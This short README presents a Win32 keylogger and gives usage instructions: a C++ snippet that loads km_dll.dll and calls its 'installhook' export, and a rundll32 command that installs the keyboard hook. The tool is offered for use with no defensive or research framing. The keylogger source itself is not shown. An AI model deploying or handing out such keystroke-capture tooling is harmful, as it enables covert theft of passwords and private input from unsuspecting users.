# keylogger

This is a keylogger under win32

## Usage

You can put following codes in another executable project:

    static HINSTANCE hInstDll;
    typedef BOOL (CALLBACK *inshook)();
    inshook instkbhook;
    if (hInstDll = LoadLibrary(L"km_dll.dll"))
    {
        instkbhook = (inshook)GetProcAddress(hInstDll, "installhook");
        instkbhook();
    }

Or you can run this command:

    rundll32.exe KM_dll.dll,installhook
